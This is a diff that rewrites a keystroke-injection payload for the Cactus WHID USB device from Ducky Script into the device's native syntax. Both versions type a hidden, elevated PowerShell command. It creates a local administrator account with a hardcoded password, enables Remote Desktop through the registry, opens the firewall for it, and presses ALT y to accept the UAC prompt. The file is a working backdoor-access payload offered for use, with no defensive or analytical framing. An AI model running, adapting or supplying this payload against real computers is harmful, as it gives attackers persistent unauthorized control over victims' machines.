@@ -1,12 +1,10 @@
-REM === Cactus WHID Payload: Add Hidden Admin + Enable RDP ===
-REM Target: Windows 10/11 (requires admin UAC accept)
-REM Category: Reverse Shell & Access
-REM Description: Creates a hidden local admin and enables Remote Desktop
-REM Note: Triggers UAC prompt - ALT y auto-accepts if user has admin rights
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C net user hak5admin P@ssw0rd123! /add; net localgroup administrators hak5admin /add; reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f; netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes'"
-ENTER
-DELAY 1000
-ALT y
+Rem: Cactus WHID Payload - Add Hidden Admin + Enable RDP
+Rem: Target - Windows 10/11 (requires admin UAC accept)
+Rem: Creates a hidden local admin and enables Remote Desktop
+Rem: Triggers UAC prompt - ALT y auto-accepts if user has admin rights
+CustomDelay:1000
+Press:131+114
+CustomDelay:500
+PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C net user hak5admin P@ssw0rd123! /add; net localgroup administrators hak5admin /add; reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f; netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes'"
+CustomDelay:1000
+Press:130+121
